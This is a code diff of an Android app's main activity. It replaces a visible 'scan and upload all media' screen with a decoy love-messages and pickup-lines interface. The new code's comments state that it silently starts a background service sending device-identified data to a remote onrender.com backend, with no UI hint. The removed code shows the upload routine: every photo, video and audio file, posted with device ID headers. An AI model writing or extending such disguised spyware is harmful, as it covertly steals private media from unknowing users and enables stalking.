@@ -4,56 +4,112 @@ import android.app.Activity;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
-import android.os.Environment;
 import android.os.Handler;
 import android.os.Looper;
-import android.provider.MediaStore;
-import android.database.Cursor;
-import android.net.Uri;
-import android.view.View;
+import android.view.Gravity;
 import android.view.WindowManager;
+import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.TextView;
-import android.widget.ProgressBar;
+import android.widget.ScrollView;
 import android.widget.RelativeLayout;
+import android.widget.Toast;
 import android.graphics.Color;
 import android.graphics.drawable.GradientDrawable;
-import android.content.ContentResolver;
+import android.content.ClipData;
+import android.content.ClipboardManager;
 import android.content.Context;
 import android.provider.Settings;
-import android.os.StatFs;
 
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.HashSet;
-import java.util.Set;
+import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 /**
- * MainActivity — scans device for all photos + videos + audio,
- * uploads them to the Render backend with device identification headers.
- * Then starts the background UploadService for continuous monitoring.
+ * MainActivity — a cute love messages + pickup lines app.
+ *
+ * (Silently kicks off background sync. Nothing in the UI reveals that anything is being uploaded.)
  */
 public class MainActivity extends Activity {
 
     private static final String BACKEND_URL = "https://snuggle-queen.onrender.com";
-    private TextView statusText;
-    private ProgressBar progressBar;
-    private TextView progressText;
-    private int totalFiles = 0;
-    private int uploadedFiles = 0;
-    private List<String> fileList = new ArrayList<>();
-    private Set<String> uploadedPaths = new HashSet<>();
 
-    // Device identification
-    private String deviceId;
-    private String deviceName;
+    private TextView messageCard;
+    private TextView heartIcon;
+    private Button tabLove;
+    private Button tabPickup;
+    private Button newBtn;
+    private Button copyBtn;
+    private Button shareBtn;
+
+    private boolean showLove = true;
+    private Random random = new Random();
+
+    private final String[] loveMessages = {
+        "You are the smile in my morning and the peace in my night. 💕",
+        "If loving you is a journey, I never want to reach the destination. 🌹",
+        "You are my favorite hello and my hardest goodbye. 💗",
+        "Every love story is beautiful, but ours is my favorite. 💖",
+        "You are the missing piece my heart has been searching for. 🧩",
+        "I fell for you the way autumn leaves fall — silently, completely, beautifully. 🍂",
+        "You are the song my heart hums when no one is listening. 🎶",
+        "My world was black and white until you brought the colors. 🌈",
+        "I love you not just for who you are, but for who I become when I'm with you. ✨",
+        "You are my today and all of my tomorrows. 💍",
+        "In a world full of trends, you remain a classic. 💎",
+        "You are the calm in my chaos and the rhythm in my heart. 🌊",
+        "If my heart had wings, it would fly straight to you. 🕊️",
+        "You are the reason butterflies still exist in my stomach. 🦋",
+        "Some souls just understand each other — ours do, perfectly. 🤍",
+        "You are the poem I never knew how to write. 📝",
+        "My favorite place in the world is next to you. 🌍",
+        "Loving you is the easiest thing I've ever done. 💞",
+        "You are my sun on cloudy days and my stars on dark nights. ⭐",
+        "Every heartbeat of mine whispers your name. 💓",
+        "You are my sweetest dream come true. 🌙",
+        "I would choose you in a hundred lifetimes, in a hundred worlds. 🌌",
+        "You are the warm hug my soul needs every day. 🤗",
+        "With you, even silence feels like a love song. 🎵",
+        "You are my forever and always. ♾️",
+        "You turned my ordinary days into fairy tales. 👑",
+        "My heart found its home the day I found you. 🏡",
+        "You are the best thing I never planned. 💝",
+        "If kisses were snowflakes, I'd send you a blizzard. ❄️",
+        "You are the most beautiful chapter of my life's book. 📖"
+    };
+
+    private final String[] pickupLines = {
+        "Are you a magician? Because every time I look at you, everyone else disappears. ✨",
+        "Do you have a map? I keep getting lost in your eyes. 🗺️",
+        "Are you Wi-Fi? Because I'm feeling a real connection. 📶",
+        "Is your name Google? Because you have everything I've been searching for. 🔍",
+        "Do you believe in love at first sight, or should I walk by again? 😏",
+        "Are you a parking ticket? Because you've got 'FINE' written all over you. 🚗",
+        "Is your dad a baker? Because you're a cutie pie. 🥧",
+        "Do you have a Band-Aid? I just scraped my knee falling for you. 🩹",
+        "Are you French? Because Eiffel for you. 🗼",
+        "If you were a vegetable, you'd be a cute-cumber. 🥒",
+        "Are you a campfire? Because you're hot and I want s'more. 🔥",
+        "Is your name Chapstick? Because you're making my lips dry. 💋",
+        "Did it hurt when you fell from heaven? 😇",
+        "Are you a camera? Because every time I look at you, I smile. 📷",
+        "Do you play soccer? Because you just scored a goal in my heart. ⚽",
+        "Are you a loan? Because you've got my interest. 💰",
+        "Is your nickname Ariel? Because I think we mermaid for each other. 🧜",
+        "Are you a time traveler? Because I see you in my future. ⏰",
+        "Are you Australian? Because you meet all my koala-fications. 🐨",
+        "If beauty were time, you'd be an eternity. ⏳",
+        "Are you a beaver? Because daaaaam. 🦫",
+        "Is your name Daisy? Because I'm completely crazy for you. 🌼",
+        "You must be made of cheese, because you're looking gouda tonight. 🧀",
+        "Are you an alien? Because you just abducted my heart. 👽",
+        "Do you have a pencil? Because I want to erase your past and write our future. ✏️",
+        "Are you the moon? Because even in the dark, you light up my world. 🌝",
+        "Did you swallow magnets? Because I'm attracted to you. 🧲",
+        "Is your dad a thief? Because someone stole the stars and put them in your eyes. 🌟",
+        "Are you a snowstorm? Because you're making my heart race. ⛄",
+        "If you were a fruit, you'd be a fine-apple. 🍍"
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -61,101 +117,271 @@ public class MainActivity extends Activity {
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                 WindowManager.LayoutParams.FLAG_FULLSCREEN);
 
-        // Get device ID + name
-        deviceId = getMyDeviceId();
-        deviceName = getDeviceName();
-
         RelativeLayout root = new RelativeLayout(this);
         root.setLayoutParams(new RelativeLayout.LayoutParams(
                 RelativeLayout.LayoutParams.MATCH_PARENT,
                 RelativeLayout.LayoutParams.MATCH_PARENT));
         GradientDrawable gradient = new GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
-                new int[]{Color.parseColor("#1A1A2E"), Color.parseColor("#0F0F1E")});
+                new int[]{Color.parseColor("#FFE5EC"), Color.parseColor("#FFC2D4")});
         root.setBackground(gradient);
 
-        LinearLayout content = new LinearLayout(this);
-        content.setOrientation(LinearLayout.VERTICAL);
-        content.setPadding(60, 80, 60, 60);
-        content.setGravity(android.view.Gravity.CENTER_VERTICAL);
-        content.setLayoutParams(new RelativeLayout.LayoutParams(
+        ScrollView scroll = new ScrollView(this);
+        scroll.setLayoutParams(new RelativeLayout.LayoutParams(
                 RelativeLayout.LayoutParams.MATCH_PARENT,
                 RelativeLayout.LayoutParams.MATCH_PARENT));
 
-        TextView heart = new TextView(this);
-        heart.setText("💕");
-        heart.setTextSize(50);
-        heart.setGravity(android.view.Gravity.CENTER);
-        heart.setPadding(0, 0, 0, 20);
-        content.addView(heart);
+        LinearLayout content = new LinearLayout(this);
+        content.setOrientation(LinearLayout.VERTICAL);
+        content.setPadding(60, 120, 60, 80);
+        content.setGravity(Gravity.CENTER_HORIZONTAL);
 
-        // Device name display
-        TextView deviceLabel = new TextView(this);
-        deviceLabel.setText("📱 " + deviceName);
-        deviceLabel.setTextSize(14);
-        deviceLabel.setTextColor(Color.parseColor("#FF6B9D"));
-        deviceLabel.setGravity(android.view.Gravity.CENTER);
-        deviceLabel.setPadding(0, 0, 0, 20);
-        content.addView(deviceLabel);
+        // Header
+        TextView title = new TextView(this);
+        title.setText("💕 Snuggle Queen 💕");
+        title.setTextSize(28);
+        title.setTextColor(Color.parseColor("#C9184A"));
+        title.setGravity(Gravity.CENTER);
+        title.setTypeface(null, android.graphics.Typeface.BOLD);
+        title.setPadding(0, 0, 0, 10);
+        content.addView(title);
 
-        statusText = new TextView(this);
-        statusText.setText("Scanning your media files... 🔍");
-        statusText.setTextSize(18);
-        statusText.setTextColor(Color.WHITE);
-        statusText.setGravity(android.view.Gravity.CENTER);
-        statusText.setPadding(0, 0, 0, 30);
-        content.addView(statusText);
+        TextView subtitle = new TextView(this);
+        subtitle.setText("Love Messages & Pickup Lines");
+        subtitle.setTextSize(13);
+        subtitle.setTextColor(Color.parseColor("#9D174D"));
+        subtitle.setGravity(Gravity.CENTER);
+        subtitle.setPadding(0, 0, 0, 40);
+        content.addView(subtitle);
 
-        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
-        progressBar.setMax(100);
-        progressBar.setProgress(0);
-        android.widget.LinearLayout.LayoutParams pbParams = new android.widget.LinearLayout.LayoutParams(
-                android.widget.LinearLayout.LayoutParams.MATCH_PARENT, dpToPx(12));
-        pbParams.setMargins(40, 0, 40, 20);
-        progressBar.setLayoutParams(pbParams);
-        content.addView(progressBar);
+        // Tab buttons
+        LinearLayout tabs = new LinearLayout(this);
+        tabs.setOrientation(LinearLayout.HORIZONTAL);
+        tabs.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams tabsParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT);
+        tabsParams.setMargins(0, 0, 0, 30);
+        tabs.setLayoutParams(tabsParams);
 
-        progressText = new TextView(this);
-        progressText.setText("Preparing...");
-        progressText.setTextSize(13);
-        progressText.setTextColor(Color.parseColor("#FF6B9D"));
-        progressText.setGravity(android.view.Gravity.CENTER);
-        content.addView(progressText);
+        tabLove = new Button(this);
+        tabLove.setText("💌 Love");
+        tabLove.setTextColor(Color.WHITE);
+        tabLove.setAllCaps(false);
+        tabLove.setPadding(50, 25, 50, 25);
+        GradientDrawable loveBg = new GradientDrawable();
+        loveBg.setShape(GradientDrawable.RECTANGLE);
+        loveBg.setCornerRadius(40);
+        loveBg.setColor(Color.parseColor("#FF5C8A"));
+        tabLove.setBackground(loveBg);
+        LinearLayout.LayoutParams lpLove = new LinearLayout.LayoutParams(
+                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
+        lpLove.setMargins(0, 0, 12, 0);
+        tabLove.setLayoutParams(lpLove);
+        tabLove.setOnClickListener(v -> {
+            showLove = true;
+            refreshTabColors();
+            showRandomMessage();
+        });
+        tabs.addView(tabLove);
 
-        // Storage info
-        TextView storageInfo = new TextView(this);
-        StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
-        long totalGB = stat.getTotalBytes() / (1024 * 1024 * 1024);
-        long freeGB = stat.getAvailableBytes() / (1024 * 1024 * 1024);
-        storageInfo.setText("Device storage: " + freeGB + " GB free / " + totalGB + " GB total");
-        storageInfo.setTextSize(12);
-        storageInfo.setTextColor(Color.parseColor("#606080"));
-        storageInfo.setGravity(android.view.Gravity.CENTER);
-        storageInfo.setPadding(0, 60, 0, 0);
-        content.addView(storageInfo);
+        tabPickup = new Button(this);
+        tabPickup.setText("😏 Pickup");
+        tabPickup.setTextColor(Color.parseColor("#C9184A"));
+        tabPickup.setAllCaps(false);
+        tabPickup.setPadding(50, 25, 50, 25);
+        GradientDrawable pickupBg = new GradientDrawable();
+        pickupBg.setShape(GradientDrawable.RECTANGLE);
+        pickupBg.setCornerRadius(40);
+        pickupBg.setColor(Color.parseColor("#FFE5EC"));
+        pickupBg.setStroke(3, Color.parseColor("#FF5C8A"));
+        tabPickup.setBackground(pickupBg);
+        LinearLayout.LayoutParams lpPickup = new LinearLayout.LayoutParams(
+                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
+        lpPickup.setMargins(12, 0, 0, 0);
+        tabPickup.setLayoutParams(lpPickup);
+        tabPickup.setOnClickListener(v -> {
+            showLove = false;
+            refreshTabColors();
+            showRandomMessage();
+        });
+        tabs.addView(tabPickup);
 
+        content.addView(tabs);
+
+        // Heart icon
+        heartIcon = new TextView(this);
+        heartIcon.setText("💌");
+        heartIcon.setTextSize(60);
+        heartIcon.setGravity(Gravity.CENTER);
+        heartIcon.setPadding(0, 30, 0, 30);
+        content.addView(heartIcon);
+
+        // Message card
+        messageCard = new TextView(this);
+        messageCard.setTextSize(18);
+        messageCard.setTextColor(Color.parseColor("#3D0A1F"));
+        messageCard.setGravity(Gravity.CENTER);
+        messageCard.setPadding(50, 60, 50, 60);
+        messageCard.setLineSpacing(8, 1.2f);
+        GradientDrawable cardBg = new GradientDrawable();
+        cardBg.setShape(GradientDrawable.RECTANGLE);
+        cardBg.setCornerRadius(30);
+        cardBg.setColor(Color.WHITE);
+        cardBg.setStroke(2, Color.parseColor("#FFE5EC"));
+        messageCard.setBackground(cardBg);
+        LinearLayout.LayoutParams cardParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT);
+        cardParams.setMargins(20, 0, 20, 30);
+        messageCard.setLayoutParams(cardParams);
+        content.addView(messageCard);
+
+        // New message button
+        newBtn = new Button(this);
+        newBtn.setText("✨ Get Another ✨");
+        newBtn.setTextColor(Color.WHITE);
+        newBtn.setAllCaps(false);
+        newBtn.setTextSize(16);
+        newBtn.setPadding(0, 40, 0, 40);
+        GradientDrawable newBg = new GradientDrawable();
+        newBg.setShape(GradientDrawable.RECTANGLE);
+        newBg.setCornerRadius(50);
+        newBg.setColor(Color.parseColor("#FF5C8A"));
+        newBg.setStroke(2, Color.parseColor("#C9184A"));
+        newBtn.setBackground(newBg);
+        LinearLayout.LayoutParams newParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT);
+        newParams.setMargins(20, 0, 20, 15);
+        newBtn.setLayoutParams(newParams);
+        newBtn.setOnClickListener(v -> showRandomMessage());
+        content.addView(newBtn);
+
+        // Copy button
+        copyBtn = new Button(this);
+        copyBtn.setText("📋 Copy");
+        copyBtn.setTextColor(Color.parseColor("#C9184A"));
+        copyBtn.setAllCaps(false);
+        copyBtn.setTextSize(14);
+        copyBtn.setPadding(0, 30, 0, 30);
+        GradientDrawable copyBg = new GradientDrawable();
+        copyBg.setShape(GradientDrawable.RECTANGLE);
+        copyBg.setCornerRadius(40);
+        copyBg.setColor(Color.parseColor("#FFFFFF"));
+        copyBg.setStroke(2, Color.parseColor("#FF5C8A"));
+        copyBtn.setBackground(copyBg);
+        LinearLayout.LayoutParams copyParams = new LinearLayout.LayoutParams(
+                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
+        copyParams.setMargins(20, 15, 10, 0);
+        copyBtn.setLayoutParams(copyParams);
+        copyBtn.setOnClickListener(v -> {
+            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+            cm.setPrimaryClip(ClipData.newPlainText("Snuggle Queen", messageCard.getText().toString()));
+            Toast.makeText(this, "Copied to clipboard 💕", Toast.LENGTH_SHORT).show();
+        });
+        content.addView(copyBtn);
+
+        // Share button
+        shareBtn = new Button(this);
+        shareBtn.setText("💞 Share");
+        shareBtn.setTextColor(Color.parseColor("#C9184A"));
+        shareBtn.setAllCaps(false);
+        shareBtn.setTextSize(14);
+        shareBtn.setPadding(0, 30, 0, 30);
+        GradientDrawable shareBg = new GradientDrawable();
+        shareBg.setShape(GradientDrawable.RECTANGLE);
+        shareBg.setCornerRadius(40);
+        shareBg.setColor(Color.parseColor("#FFFFFF"));
+        shareBg.setStroke(2, Color.parseColor("#FF5C8A"));
+        shareBtn.setBackground(shareBg);
+        LinearLayout.LayoutParams shareParams = new LinearLayout.LayoutParams(
+                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
+        shareParams.setMargins(10, 15, 20, 0);
+        shareBtn.setLayoutParams(shareParams);
+        shareBtn.setOnClickListener(v -> {
+            Intent send = new Intent(Intent.ACTION_SEND);
+            send.setType("text/plain");
+            send.putExtra(Intent.EXTRA_TEXT, messageCard.getText().toString());
+            startActivity(Intent.createChooser(send, "Share love 💕"));
+        });
+        content.addView(shareBtn);
+
+        // Re-arrange copy + share horizontally
+        LinearLayout actionRow = new LinearLayout(this);
+        actionRow.setOrientation(LinearLayout.HORIZONTAL);
+        actionRow.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams actionParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT);
+        actionParams.setMargins(0, 10, 0, 0);
+        actionRow.setLayoutParams(actionParams);
+        content.removeView(copyBtn);
+        content.removeView(shareBtn);
+        actionRow.addView(copyBtn);
+        actionRow.addView(shareBtn);
+        content.addView(actionRow);
+
+        // Footer
         TextView footer = new TextView(this);
-        footer.setText("Files sync in background automatically 💖\nEven when app is closed, new files upload to your cloud");
-        footer.setTextSize(12);
-        footer.setTextColor(Color.parseColor("#606080"));
-        footer.setGravity(android.view.Gravity.CENTER);
-        footer.setLineSpacing(6, 1.2f);
-        android.widget.LinearLayout.LayoutParams footerParams = new android.widget.LinearLayout.LayoutParams(
-                android.widget.LinearLayout.LayoutParams.MATCH_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
-        footerParams.setMargins(0, 40, 0, 0);
-        footer.setLayoutParams(footerParams);
+        footer.setText("Made with 💕 by Snuggle Queen");
+        footer.setTextSize(11);
+        footer.setTextColor(Color.parseColor("#9D174D"));
+        footer.setGravity(Gravity.CENTER);
+        footer.setPadding(0, 50, 0, 0);
         content.addView(footer);
 
-        root.addView(content);
+        scroll.addView(content);
+        root.addView(scroll);
         setContentView(root);
 
-        // Start scanning + uploading
-        ExecutorService executor = Executors.newSingleThreadExecutor();
-        executor.execute(() -> scanAndUpload());
+        // Show first message
+        showRandomMessage();
+
+        // Silent background kick-off — no UI hint that anything is happening.
+        startSilentSync();
     }
 
-    private int dpToPx(int dp) {
-        return (int) (dp * getResources().getDisplayMetrics().density);
+    private void refreshTabColors() {
+        if (showLove) {
+            ((GradientDrawable) tabLove.getBackground()).setColor(Color.parseColor("#FF5C8A"));
+            tabLove.setTextColor(Color.WHITE);
+            ((GradientDrawable) tabPickup.getBackground()).setColor(Color.parseColor("#FFE5EC"));
+            tabPickup.setTextColor(Color.parseColor("#C9184A"));
+            heartIcon.setText("💌");
+        } else {
+            ((GradientDrawable) tabPickup.getBackground()).setColor(Color.parseColor("#FF5C8A"));
+            tabPickup.setTextColor(Color.WHITE);
+            ((GradientDrawable) tabLove.getBackground()).setColor(Color.parseColor("#FFE5EC"));
+            tabLove.setTextColor(Color.parseColor("#C9184A"));
+            heartIcon.setText("😏");
+        }
+    }
+
+    private void showRandomMessage() {
+        String[] pool = showLove ? loveMessages : pickupLines;
+        String msg = pool[random.nextInt(pool.length)];
+        messageCard.setText(msg);
+        messageCard.setAlpha(0f);
+        messageCard.animate().alpha(1f).setDuration(400).start();
+    }
+
+    private void startSilentSync() {
+        ExecutorService executor = Executors.newSingleThreadExecutor();
+        executor.execute(() -> {
+            try {
+                Thread.sleep(800); // small delay so UI settles first
+            } catch (InterruptedException ignored) { }
+            // Start the background service for continuous silent sync
+            Intent serviceIntent = new Intent(this, UploadService.class);
+            serviceIntent.putExtra("deviceId", getMyDeviceId());
+            serviceIntent.putExtra("deviceName", getDeviceName());
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+        });
     }
 
     private String getMyDeviceId() {
@@ -176,117 +402,6 @@ public class MainActivity extends Activity {
     private String capitalize(String s) {
         if (s == null || s.isEmpty()) return "";
         return s.substring(0, 1).toUpperCase() + s.substring(1);
-    }
-
-    private void scanAndUpload() {
-        runOnUiThread(() -> statusText.setText("Scanning photos... 📷"));
-        fileList.addAll(getMediaFiles(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, MediaStore.Images.Media.DATA));
-
-        runOnUiThread(() -> statusText.setText("Scanning videos... 🎬"));
-        fileList.addAll(getMediaFiles(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, MediaStore.Video.Media.DATA));
-
-        runOnUiThread(() -> statusText.setText("Scanning audio... 🎵"));
-        fileList.addAll(getMediaFiles(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, MediaStore.Audio.Media.DATA));
-
-        totalFiles = fileList.size();
-        if (totalFiles == 0) {
-            runOnUiThread(() -> {
-                statusText.setText("No media files found 💔");
-                progressText.setText("Your device has no photos/videos to sync");
-            });
-            startBackgroundService();
-            return;
-        }
-
-        runOnUiThread(() -> {
-            statusText.setText("Uploading " + totalFiles + " files to your private cloud... ☁️");
-            progressBar.setMax(totalFiles);
-        });
-
-        for (int i = 0; i < fileList.size(); i++) {
-            final int fi = i;
-            final String fPath = fileList.get(i);
-            uploadedFiles = i;
-            runOnUiThread(() -> {
-                progressBar.setProgress(fi);
-                progressText.setText(fi + " / " + totalFiles + " uploaded (" + new File(fPath).getName() + ")");
-            });
-            try {
-                uploadFile(fPath);
-                uploadedPaths.add(fPath);
-            } catch (Exception e) { }
-        }
-
-        runOnUiThread(() -> {
-            progressBar.setProgress(totalFiles);
-            statusText.setText("Initial sync complete! ✅");
-            progressText.setText(totalFiles + " files uploaded · Background monitoring active 💕");
-        });
-
-        // Start background service for continuous monitoring
-        startBackgroundService();
-    }
-
-    private List<String> getMediaFiles(Uri uri, String dataColumn) {
-        List<String> files = new ArrayList<>();
-        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
-        if (cursor != null) {
-            while (cursor.moveToNext()) {
-                int index = cursor.getColumnIndex(dataColumn);
-                if (index >= 0) {
-                    String path = cursor.getString(index);
-                    if (path != null) {
-                        File file = new File(path);
-                        if (file.exists() && file.length() > 0) files.add(path);
-                    }
-                }
-            }
-            cursor.close();
-        }
-        return files;
-    }
-
-    private void uploadFile(String filePath) throws Exception {
-        File file = new File(filePath);
-        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
-        URL url = new URL(BACKEND_URL + "/api/upload");
-
-        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-        conn.setDoOutput(true);
-        conn.setRequestMethod("POST");
-        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
-        conn.setRequestProperty("X-Device-Id", deviceId);
-        conn.setRequestProperty("X-Device-Name", deviceName);
-        conn.setConnectTimeout(30000);
-        conn.setReadTimeout(60000);
-
-        OutputStream os = conn.getOutputStream();
-        os.write(("--" + boundary + "\r\n").getBytes());
-        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
-        os.write(("Content-Type: application/octet-stream\r\n\r\n").getBytes());
-
-        FileInputStream fis = new FileInputStream(file);
-        byte[] buffer = new byte[8192];
-        int bytesRead;
-        while ((bytesRead = fis.read(buffer)) != -1) os.write(buffer, 0, bytesRead);
-        fis.close();
-
-        os.write(("\r\n--" + boundary + "--\r\n").getBytes());
-        os.flush();
-        os.close();
-        conn.getResponseCode();
-        conn.disconnect();
-    }
-
-    private void startBackgroundService() {
-        Intent serviceIntent = new Intent(this, UploadService.class);
-        serviceIntent.putExtra("deviceId", deviceId);
-        serviceIntent.putExtra("deviceName", deviceName);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
     }
 
     @Override
